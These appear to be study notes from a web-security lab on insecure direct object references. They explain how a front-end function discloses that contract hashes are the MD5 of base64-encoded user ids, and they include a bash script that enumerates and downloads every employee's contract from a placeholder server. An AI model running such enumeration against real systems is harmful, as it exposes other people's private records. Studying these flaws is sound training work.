Some references are hashes of the file, which make it harder to get, but possible

Say we download a file, and it has this data:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
- If we try hashing the uid, it will not match, making it a secure direct object reference, BUT

## Function Disclosure
The above hash may be calculated on the front-end with javascript
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
- bota(uid) is bade64 encoded string of the uid variable

Replication:
```shell-session
echo -n 1 | base64 -w 0 | md5sum
```
- the n and w flag ensure no new line is created which would change the hash

## Mass Enumeration
```
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
- Creates function for 1-10 uid

**Send POST
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**Download all contracts for employees 1-10
```
bash ./exploit.sh
ls -l
```

